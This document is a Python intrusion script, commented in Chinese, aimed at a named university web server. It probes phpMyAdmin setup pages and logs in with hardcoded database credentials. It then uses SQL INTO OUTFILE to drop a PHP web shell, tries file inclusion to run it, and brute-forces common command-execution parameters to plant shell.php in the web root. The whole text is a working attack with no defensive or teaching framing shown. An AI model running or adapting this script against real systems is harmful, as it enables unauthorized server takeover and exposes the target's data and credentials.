#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
pma_url = url + "/phpmyadmin/"

# 最后尝试：通过phpMyAdmin的setup脚本
print("[*] 尝试phpMyAdmin setup脚本...")
setup_paths = [
    "/phpmyadmin/setup/",
    "/phpmyadmin/setup/index.php",
    "/phpmyadmin/setup/frames/config.inc.php",
]

for setup_path in setup_paths:
    resp = requests.get(url + setup_path, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[+] Setup可访问: {setup_path}")
        # setup可能允许写入配置文件

# 尝试通过phpMyAdmin的SQL执行写入到已知可写目录
print("[*] 尝试写入到/tmp然后通过文件包含...")
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(pma_url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text)
if token:
    token = token.group(1)
    
    # 写入到/tmp
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/tmp/shell.php';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 尝试通过文件包含读取
    # 如果主站有文件包含漏洞，可以包含/tmp/shell.php

# 检查主站是否有文件包含
print("[*] 检查主站文件包含...")
main_files = ["/index.php", "/portal/index.php"]
for main_file in main_files:
    resp = requests.get(url + main_file, verify=False, timeout=5)
    if resp.status_code == 200 and "include" in resp.text:
        # 尝试文件包含
        test_url = url + main_file + "?file=/tmp/shell.php&c=id"
        resp2 = requests.get(test_url, verify=False, timeout=5)
        if "uid=" in resp2.text:
            print(f"[+] 文件包含成功: {test_url}")
            exit(0)

# 最后手段：直接暴力测试常见RCE点
print("[*] 暴力测试常见RCE点...")
rce_paths = [
    "/index.php?cmd=id",
    "/index.php?c=id", 
    "/index.php?exec=id",
    "/index.php?action=system&cmd=id",
    "/portal/index.php?cmd=id",
]

for rce_path in rce_paths:
    resp = requests.get(url + rce_path, verify=False, timeout=5)
    if "uid=" in resp.text:
        print(f"[+] RCE成功: {url}{rce_path}")
        # 写入shell
        shell_path = rce_path.replace("id", "echo '<?php system(\\$_GET[c]); ?>' > shell.php")
        requests.get(url + shell_path, verify=False, timeout=5)
        test_shell = requests.get(url + "/shell.php?c=id", verify=False, timeout=5)
        if "uid=" in test_shell.text:
            print(f"[+] Shell获取成功: {url}/shell.php?c=id")
            exit(0)

print("[-] 所有方法尝试完毕")
